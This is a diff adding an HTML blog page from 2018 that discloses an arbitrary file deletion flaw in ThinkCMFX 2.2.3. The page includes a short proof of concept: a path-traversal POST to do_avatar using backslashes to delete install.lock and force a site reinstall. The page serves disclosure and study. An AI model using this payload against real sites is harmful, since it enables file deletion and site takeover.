@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      Thinkcmfx2.2.3 File Deletion Vulnerability | Unothing 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="Unothing">
+    
+    
+
+    <meta name="description" content="Official website:https://www.thinkcmf.com/ Download link:http://www.mycodes.net/do/job.php?job=down_encode&amp;amp;fid=45&amp;amp;id=7058&amp;amp;rid=7088&amp;amp;i_id=4759&amp;amp;mid=106&amp;amp;field=softurl&amp;amp;ti=0 Vers">
+<meta name="keywords" content="thinkcmf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkcmfx2.2.3 File Deletion Vulnerability | Unothing">
+<meta property="og:url" content="https://unothing.github.io/posts/thinkcmfx223/index.html">
+<meta property="og:site_name" content="Unothing">
+<meta property="og:description" content="Official website:https://www.thinkcmf.com/ Download link:http://www.mycodes.net/do/job.php?job=down_encode&amp;amp;fid=45&amp;amp;id=7058&amp;amp;rid=7088&amp;amp;i_id=4759&amp;amp;mid=106&amp;amp;field=softurl&amp;amp;ti=0 Vers">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://unothing.github.io/posts/thinkcmfx223/code.png">
+<meta property="og:image" content="https://unothing.github.io/posts/thinkcmfx223/reinstall.png">
+<meta property="og:updated_time" content="2018-08-29T14:33:56.680Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Thinkcmfx2.2.3 File Deletion Vulnerability | Unothing">
+<meta name="twitter:description" content="Official website:https://www.thinkcmf.com/ Download link:http://www.mycodes.net/do/job.php?job=down_encode&amp;amp;fid=45&amp;amp;id=7058&amp;amp;rid=7088&amp;amp;i_id=4759&amp;amp;mid=106&amp;amp;field=softurl&amp;amp;ti=0 Vers">
+<meta name="twitter:image" content="https://unothing.github.io/posts/thinkcmfx223/code.png">
+    
+    
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Unothing</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">列表</a></li>
+              
+                
+                <li class="navigation__item"><a href="/categories" title="" class="">分类</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">Thinkcmfx2.2.3 File Deletion Vulnerability</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2018-08-29" class="post-meta__date date">2018-08-29</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+            <font class="categories">
+            &#8226; 分类:
+            <a class="categories-link" href="/categories/代码审计/">代码审计</a>
+            </font>
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/thinkcmf/">thinkcmf</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3><span id="official-website">Official website:</span></h3><p><a href="https://www.thinkcmf.com/" target="_blank" rel="external">https://www.thinkcmf.com/</a></p>
+<h3><span id="download-link">Download link:</span></h3><p><a href="http://www.mycodes.net/do/job.php?job=down_encode&amp;fid=45&amp;id=7058&amp;rid=7088&amp;i_id=4759&amp;mid=106&amp;field=softurl&amp;ti=0" target="_blank" rel="external">http://www.mycodes.net/do/job.php?job=down_encode&amp;fid=45&amp;id=7058&amp;rid=7088&amp;i_id=4759&amp;mid=106&amp;field=softurl&amp;ti=0</a></p>
+<h3><span id="version">Version:</span></h3><p>ThinkCMFX2.2.3</p>
+<h3><span id="vulnerability-type">Vulnerability type:</span></h3><p>File Manipulation</p>
+<h3><span id="description">Description:</span></h3><p>Thinkcmfx2.2.3 has an arbitrary file deletion vulnerability in the \application\User\Controller\ProfileController.class.php.</p>
+<p>A member user can delete any file in the windows server.</p>
+<h3><span id="file">File:</span></h3><p>\application\User\Controller\ProfileController.class.php</p>
+<h3><span id="detail">Detail</span></h3><p><img src="code.png" alt=""></p>
+<p>In function do_avatar , the program doesn’t verify the post parameter ‘imgurl’ , so we can deliver a file path to imgurl . Then we post the data twice to trigger sp_delete_avatar function which can delete any file .<br>In line 176 , the program delete any ‘/’ , but in windows we can use ‘\’ to bypass it.</p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/ThinkCMFX/index.php?g=user&amp;m=profile&amp;a=do_avatar</div><div class="line">POST:imgurl=..\..\..\data\install.lock</div></pre></td></tr></table></figure></p>
+<p>First register a member test</p>
+<p>Then use the poc twice , we can delete the install.lock file.</p>
+<p>Now we can reinstall the website ! </p>
+<p><img src="reinstall.png" alt=""></p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
